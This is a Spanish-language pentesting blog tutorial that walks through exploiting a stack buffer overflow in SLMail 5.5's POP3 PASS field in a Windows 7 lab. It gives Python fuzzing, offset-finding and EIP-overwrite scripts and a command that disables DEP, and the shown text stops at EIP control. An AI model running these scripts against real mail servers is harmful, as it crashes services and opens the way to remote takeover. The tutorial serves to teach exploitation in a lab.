---
layout: single
title: Stack Buffer Overflow en Windows
excerpt: "En este artículo vemos cómo explotar un stack buffer overflow en una aplicación vulnerable llamada SLMail corriendo en una máquina virtual con windows 7 x86."
date: 2021-02-13
classes: wide
header:
  teaser: /assets/images/Stack-Buffer-Overflow-Windows/buffer-overflow-windows.jpg
  teaser_home_page: true
categories:
  - Buffer-Overflow
tags:
  - Buffer Overflow
  - Python
  - Pentesting
---

![](/assets/images/Stack-Buffer-Overflow-Windows/buffer-overflow-windows.jpg)

En este artículo veremos cómo explotar un buffer overflow en una aplicación vulnerable llamada SLMail corriendo en una máquina virtual Windows 7 x86.

Primero quiero agradecer a s4vitar por su tutorial y por servirme de inspiración.

Necesitaremos una máquina virtual con windows 7 x86, el software SLMail v5.5, inmunity debuguer y mona.py para añadir funcionalidades al debuguer.

Links de descarga:

[SLMail 5.5](https://slmail.software.informer.com/5.5/)<br>
[Inmunity debuguer](https://www.immunityinc.com/products/debugger/)<br>
[Mona.py](https://github.com/corelan/mona/blob/master/mona.py)<br>

Instalaremos SLMail y inmunity debuguer en la máquina windows, y luego añadiremos mona al inmunity debuguer. Para ello descargaremos el script y lo colocaremos en la ruta C:\Program Files\Inmunity Inc\Inmunity Debuguer\PyCommands\.

Además tendremos que crear reglas en el firewall de windows para permitan el tráfico en los puertos 25 y 110. Y por último deshabilitar el DEP con el siguiente comando ejecutado como administrador:

`bcdedit.exe /set {current} nx AllwaysOff`

Cuando tengamos esto ya podemos empezar a practicar.

Si lanzamos un nmap a la ip de la máquina tiene que responder con los puertos 25 y 110 abiertos, entre otros.

![](/assets/images/Stack-Buffer-Overflow-Windows/nmap-slmail.png)

En la máquina windows siempre ejecutaremos las aplicaciones SLMail y inmunity debuguer como administrador. Abrimos las dos aplicaciones, en el debuguer pulsamos en File/Atach, seleccionamos el proceso SLmail, y pulsamos en el icono Run Program o pulsamos F9.

![](/assets/images/Stack-Buffer-Overflow-Windows/slmail.png)

![](/assets/images/Stack-Buffer-Overflow-Windows/inmunity.png)

En este punto si hacemos un searchsploit slmail vemos que hay varios exploits que se aprovechan del campo PASS en el momento de la autenticación. Con lo cual el campo vulnerable es PASS.

![](/assets/images/Stack-Buffer-Overflow-Windows/searchsploit-slmail.png)

## Explicación sencilla del stack buffer overflow

Una explicación sencilla sería la siguiente. Cuando alguien se autentica contra el SLMail, tiene que introducir lógicamente un usuario y contraseña. Bien pues en el campo PASS no se está controlando la cantidad de bytes que puede aceptar, con lo cual si nosotros le pasamos más de los que tiene definidos a nivel de código se producirá un desbordamiento de memória, y estaremos sobreescribiendo partes de la memória que no deberian de tomar esos valores para una ejecución normal del programa.

Se trata de tomar el control del registro EIP, que siempre apunta a la próxima dirección de memoria a ejecutar, para que el flujo del programa se desplace hasta la dirección que nosotros queramos, donde habremos sobreescrito los valores de esas direcciones con nuestro shellcode, que nos lanzará una reverse shell y nos conectará a la máquina victima.

## Exploit inicial

Empezamos con el exploit. Crearemos un script en python que se conectará a la máquina windows en el puerto 110 y le pasará un usuario, y en el campo PASS le iremos pasando el carácter "A" muchas veces para ver cuando corrompe el programa.

El código es el siguiente:

```python
#!/usr/bin/python
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
        print "\n[!] Uso: python " + sys.argv[0] + " <ip_address>\n"
        sys.exit(0)

#Variables globales
ip_address = '192.168.1.20'
rport = 110

if __name__ == '__main__':
        buffer = ["A"]
        contador = 350

        while len(buffer) < 32:
                buffer.append("A"*contador)
                contador += 350


        p1 = log.progress("Data")


        for strings in buffer:

                try:
                        p1.status("Enviando %s bytes" % len(strings))
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip_address, rport))

                        data = s.recv(1024)

                        s.send("USER ximo\r\n")
                        data = s.recv(1024)
                        s.send("PASS %s\r\n" % strings)
                        data = s.recv(1024)

                except:
                        print "\n[!] Ha habido un error de conexión\n"
                        sys.exit(1)

```

El exploit le pasará nuestras "A" en el campo PASS de 350 en 350, la primera vez una "A", la segunda 350 "A", la tercera 700 "A", etc. También podremos ver cuantas "A" necesitamos pasarle para que se detenga la ejecución del programa y provocar una denegación de servicio.

Ejecutamos el exploit y vemos lo que sucede en el inmunity debuguer. Podemos ver que se ha corrompido el programa porque hemos sobreescrito direcciones de memória, incluido el registro EIP que ahora apunta a la dirección 0x41414141, que son nuestras "A", y al no ser una dirección válida se detiene el flujo de ejecución.

![](/assets/images/Stack-Buffer-Overflow-Windows/exploit-inicial.png)

Vemos en la salida por pantalla de la ejecución del exploit que al enviar 2800 "A" es cuando desbordamos el tamaño del buffer, se sobreescribe el EIP y el programa no puede continuar porque la dirección 0x41414141 que son nuestras "A" no apunta a ninguna dirección de memória válida.

El siguiente paso es crear un patrón de carácteres aleatorios con una utilidad de Mataploit llamada pattern_create.

![](/assets/images/Stack-Buffer-Overflow-Windows/pattern_create.png)

Modificamos el script para enviar un patrón de 2700 carácteres en vez de las "A" y queda de la siguiente forma:


```python
#!/usr/bin/python
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
	print "\n[!] Uso: python " + sys.argv[0] + " <ip_address>\n"
	sys.exit(0)

#Variables globales
ip_address = '192.168.1.20'
rport = 110

if __name__ == '__main__':

	buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip_address, rport))

		data = s.recv(1024)

		s.send("USER ximo\r\n")
		data = s.recv(1024)
		s.send("PASS " + buffer + '\r\n')
		data = s.recv(1024)
			
	except:
		print "\n[!] Ha habido un error de conexión\n"
		sys.exit(1)

```

Ejecutamos el script y vemos que ahora el valor de EIP es 39694438.

![](/assets/images/Stack-Buffer-Overflow-Windows/offset.png)

Bien pues ahora con pattern_offset podemos calcular exactamente cuantos carácteres tenemos que enviar justo antes de que se sobreescriba el EIP.

![](/assets/images/Stack-Buffer-Overflow-Windows/offset2.png)

Tenemos que enviar exactamente 2606 carácteres, a partir de ahí se sobreescribirá el EIP. Vale, pues modificamos el script para enviar 2606 "A" y 4 "B", y si todo va bien veremos que EIP vale 0x42424242 que son nuestras "B", con lo cual tendremos el control del registro EIP, pudiendo insertar lo que queramos.

```python
#!/usr/bin/python
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
        print "\n[!] Uso: python " + sys.argv[0] + " <ip_address>\n"
        sys.exit(0)

#Variables globales
ip_address = '192.168.1.20'
rport = 110

if __name__ == '__main__':

        buffer = "A"*2606 + "B"*4

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_address, rport))

                data = s.recv(1024)

                s.send("USER ximo\r\n")
                data = s.recv(1024)
                s.send("PASS " + buffer + '\r\n')
                data = s.recv(1024)

        except:
                print "\n[!] Ha habido un error de conexión\n"
                sys.exit(1)

```

Ejecutamos el script y vemos que efectivamente EIP ahora vale 0x42424242 que son nuestras "B".

![](/assets/images/Stack-Buffer-Overflow-Windows/offset3.png)

